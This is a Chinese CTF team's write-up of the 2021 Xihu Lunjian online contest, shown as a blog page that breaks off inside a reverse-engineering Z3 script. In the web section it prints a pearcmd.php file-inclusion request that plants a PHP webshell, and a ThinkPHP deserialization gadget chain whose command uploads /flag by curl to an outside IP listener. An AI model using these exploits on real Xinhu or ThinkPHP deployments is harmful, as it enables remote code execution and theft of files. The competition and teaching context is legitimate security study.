<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2021年西湖论剑线上赛 SU Write-up - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="以下是我们 SU 本次 西湖论剑线上赛 的 writeup同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta property="og:type" content="blog"><meta property="og:title" content="2021年西湖论剑线上赛 SU Write-up"><meta property="og:url" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/"><meta property="og:site_name" content="su-team"><meta property="og:description" content="以下是我们 SU 本次 西湖论剑线上赛 的 writeup同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536083.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536029.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536532.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536081.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536406.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/(null)"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536443.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536448.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536255.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536576.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536714.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536165.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536171.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536245.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536493.jpg"><meta property="og:image" content="https://txq2mmofcw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGJjMGUyYWQ2YWE3NDgyYWRhNjNjZDM1MGVkZjJiOGRfRTE2YVRhMVBDbThtbE1DdFoxWVNFdEhVZjlrV1kxaXpfVG9rZW46Ym94Y25jWWhDZ3JrUUxTbkZCOGJ5V0gyOGViXzE2Mzc0ODg1MzA6MTYzNzQ5MjEzMF9WNA"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536234.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536884.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175537028.jpg"><meta property="og:image" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536861.jpg"><meta property="article:published_time" content="2021-11-21T09:53:27.000Z"><meta property="article:modified_time" content="2025-06-09T03:22:11.426Z"><meta property="article:author" content="SUers"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536083.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/"},"headline":"2021年西湖论剑线上赛 SU Write-up","image":["https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536083.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536029.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536532.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536081.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536406.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536443.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536448.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536255.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536576.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536714.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536165.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536171.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536245.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536493.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536234.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536884.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175537028.jpg","https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/20211121175536861.jpg"],"datePublished":"2021-11-21T09:53:27.000Z","dateModified":"2025-06-09T03:22:11.426Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"以下是我们 SU 本次 西湖论剑线上赛 的 writeup同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"}</script><link rel="canonical" href="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-11-21T09:53:27.000Z" title="2021/11/21 17:53:27">2021-11-21</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-06-09T03:22:11.426Z" title="2025/6/9 11:22:11">2025-06-09</time></span><span class="level-item">35 minutes read (About 5312 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2021年西湖论剑线上赛 SU Write-up</h1><div class="content"><p>以下是我们 SU 本次 西湖论剑线上赛 的 writeup<br>同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#101;&#x72;&#115;&#x5f;&#x78;&#x63;&#116;&#102;&#x40;&#49;&#50;&#54;&#46;&#99;&#111;&#x6d;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p>
<span id="more"></span>
<hr>
<p>以下是我们 SU 本次 西湖论剑线上赛 的 writeup<br>同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#101;&#x72;&#115;&#95;&#120;&#99;&#116;&#x66;&#64;&#x31;&#x32;&#54;&#46;&#99;&#x6f;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770) </p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#web1"><strong>web1</strong></a></li>
<li><a href="#ezupload">EZupload</a></li>
<li><a href="#tp">TP</a></li>
<li><a href="#hao-mei-de-web">灏妹的web</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#zhen-qian-dao">真·签到</a></li>
<li><a href="#yusa-de-xiao-mi-mi">yusa的小秘密</a></li>
</ul>
</li>
<li><a href="#reverse">Reverse</a><ul>
<li><a href="#ror">ROR</a></li>
<li><a href="#tacticalarmed">TacticalArmed</a></li>
<li><a href="#gghdl">gghdl</a></li>
<li><a href="#xu-jia-de-fen-si">虚假的粉丝</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#string-go">String go</a></li>
<li><a href="#blind">Blind</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#dsa">DSA</a></li>
<li><a href="#filterrandom">FilterRandom</a></li>
<li><a href="#hardrsa">HardRSA</a></li>
<li><a href="#mi-ma-ren-ji-he">密码人集合</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>


<h2><span id="web">Web</span><a href="#web" class="header-anchor"></a></h2><h3><span id="web1"><strong>web1</strong></span><a href="#web1" class="header-anchor"></a></h3><p>是个信呼的web应用，老洞都打不了，没有给写入的权限，</p>
<p>所以我们需要去找新的利用点</p>
<p><img src="./20211121175536083.jpg" alt="img"></p>
<p>这个地方把他生成的方法类中的displayfile传入到了下面的mpathname中</p>
<p><img src="./20211121175536029.jpg" alt="img"></p>
<p>于是在这个位置就可能会造成</p>
<p>文件包含</p>
<p>然后全局搜索一下那个displayfile</p>
<p>发现在webmain&#x2F;index&#x2F;indexAction.php中的getshtmlAction方法里传入一个surl，然后经过拼接传入到了displayfile中，而surl是我们可控的，所以这里确实存在一个文件包含</p>
<p><img src="./20211121175536532.jpg" alt="img"></p>
<p>这里因为拼接了后缀为php，而我们没有上传文件的权限，所以只能包含已经有的文件。然后就想到前阵子p神提出的pearcmd.php的利用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?+config-create+/&amp;m=index&amp;a=getshtml&amp;surl=Li4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA==&amp;/<span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="number">0</span>])<span class="meta">?&gt;</span>+/tmp/a.php</span><br></pre></td></tr></table></figure>
<p>然后再去包含生成的a.php就可以rce</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">index.php?m=index&amp;a=getshtml&amp;surl=Li4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA==</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3><span id="ezupload">EZupload</span><a href="#ezupload" class="header-anchor"></a></h3><p>描述:环境每两分钟重置一次。</p>
<ul>
<li>.user.ini(auto_prepend_file&#x3D;”&#x2F;flag”)</li>
<li>访问Latte的tempdir缓存php文件（2.10.4版本）就可触发.user.ini</li>
</ul>
<h3><span id="tp">TP</span><a href="#tp" class="header-anchor"></a></h3><p>先file结合过滤器取读取控制器代码，这里有个直接反序列点；利用tp的路由规则直接来打；2333&#x2F;&#x2F;&#x2F;public绕一下parse_url就可；</p>
<p>我之前发过两个thinkphp的另反序列化链；</p>
<p><a href="https://www.freebuf.com/articles/web/263458.html">https://www.freebuf.com/articles/web/263458.html</a></p>
<p>用其中第一个链直接打，然后curl将文件发送过来就可；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#bash回显；网页不回显；</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractCache</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> <span class="title class_">protected</span> $<span class="title class_">autosave</span> = <span class="title class_">false</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span> = [];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$cache</span> = [<span class="string">&#x27;`curl -X POST -F xx=@/flag http://120.53.29.60:9900`&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">AbstractCache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>,<span class="variable">$key</span>,<span class="variable">$expire</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line"> <span class="variable language_">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Driver</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;s1mple&#x27;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line"></span><br><span class="line"> ];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">$<span class="title class_">b</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> think\filesystem\<span class="title function_ invoke__">CacheStore</span>(<span class="variable">$b</span>,<span class="string">&#x27;s1mple&#x27;</span>,<span class="string">&#x27;1111&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>监听一下就行；</p>
<h3><span id="hao-mei-de-web">灏妹的web</span><a href="#hao-mei-de-web" class="header-anchor"></a></h3><p>这题是个信息泄漏，扫一下目录；&#x2F;.idea&#x2F;dataSources.xml</p>
<p>这个文件里直接有flag；</p>
<h2><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h2><h3><span id="zhen-qian-dao">真·签到</span><a href="#zhen-qian-dao" class="header-anchor"></a></h3><p>进入西湖论剑网络安全大赛微信公众号，发送语音说出“西湖论剑2021，我来了。”即可获得本题 flag：） </p>
<h3><span id="yusa-de-xiao-mi-mi">yusa的小秘密</span><a href="#yusa-de-xiao-mi-mi" class="header-anchor"></a></h3><p>Ycrcb隐写提取得到图片，放stegsolve中得到flag</p>
<p><img src="./20211121175536081.jpg" alt="img"></p>
<h2><span id="reverse">Reverse</span><a href="#reverse" class="header-anchor"></a></h2><h3><span id="ror">ROR</span><a href="#ror" class="header-anchor"></a></h3><p><code>main</code> 函数很清晰</p>
<p><img src="./20211121175536406.jpg" alt="img"></p>
<p>Z3 一把梭</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CHARSET = [<span class="number">0x65</span>, <span class="number">0x08</span>, <span class="number">0xF7</span>, <span class="number">0x12</span>, <span class="number">0xBC</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0xB8</span>, <span class="number">0x83</span>, <span class="number">0x7B</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x02</span>, <span class="number">0xD5</span>, <span class="number">0x34</span>, <span class="number">0xBD</span>, <span class="number">0x9F</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0xD4</span>, <span class="number">0xD7</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xEB</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0x5E</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x7D</span>, <span class="number">0xF4</span>, <span class="number">0x11</span>, <span class="number">0xFF</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xAD</span>, <span class="number">0x57</span>, <span class="number">0x46</span>, <span class="number">0x67</span>, <span class="number">0x2A</span>, <span class="number">0x9D</span>, <span class="number">0x7F</span>, <span class="number">0xD2</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xE1</span>, <span class="number">0x21</span>, <span class="number">0x8B</span>, <span class="number">0x1D</span>, <span class="number">0x5A</span>, <span class="number">0x91</span>, <span class="number">0x38</span>, <span class="number">0x94</span>, <span class="number">0xF9</span>, <span class="number">0x0C</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x00</span>, <span class="number">0xCA</span>, <span class="number">0xE8</span>, <span class="number">0xCB</span>, <span class="number">0x5F</span>, <span class="number">0x19</span>, <span class="number">0xF6</span>, <span class="number">0xF0</span>, <span class="number">0x3C</span>, <span class="number">0xDE</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xDA</span>, <span class="number">0xEA</span>, <span class="number">0x9C</span>, <span class="number">0x14</span>, <span class="number">0x75</span>, <span class="number">0xA4</span>, <span class="number">0x0D</span>, <span class="number">0x25</span>, <span class="number">0x58</span>, <span class="number">0xFC</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x44</span>, <span class="number">0x86</span>, <span class="number">0x05</span>, <span class="number">0x6B</span>, <span class="number">0x43</span>, <span class="number">0x9A</span>, <span class="number">0x6D</span>, <span class="number">0xD1</span>, <span class="number">0x63</span>, <span class="number">0x98</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x68</span>, <span class="number">0x2D</span>, <span class="number">0x52</span>, <span class="number">0x3D</span>, <span class="number">0xDD</span>, <span class="number">0x88</span>, <span class="number">0xD6</span>, <span class="number">0xD0</span>, <span class="number">0xA2</span>, <span class="number">0xED</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xA5</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x3E</span>, <span class="number">0xF2</span>, <span class="number">0x22</span>, <span class="number">0x06</span>, <span class="number">0xF3</span>, <span class="number">0x1A</span>, <span class="number">0xA8</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x09</span>, <span class="number">0xDC</span>, <span class="number">0x7C</span>, <span class="number">0x4B</span>, <span class="number">0x5C</span>, <span class="number">0x1E</span>, <span class="number">0xA1</span>, <span class="number">0xB0</span>, <span class="number">0x71</span>, <span class="number">0x04</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0xE2</span>, <span class="number">0x9B</span>, <span class="number">0xB7</span>, <span class="number">0x10</span>, <span class="number">0x4E</span>, <span class="number">0x16</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x56</span>, <span class="number">0xD8</span>,</span><br><span class="line"></span><br><span class="line">           <span class="number">0x61</span>, <span class="number">0xB4</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x87</span>, <span class="number">0xF8</span>, <span class="number">0x0A</span>, <span class="number">0x13</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>,</span><br><span class="line"></span><br><span class="line">           <span 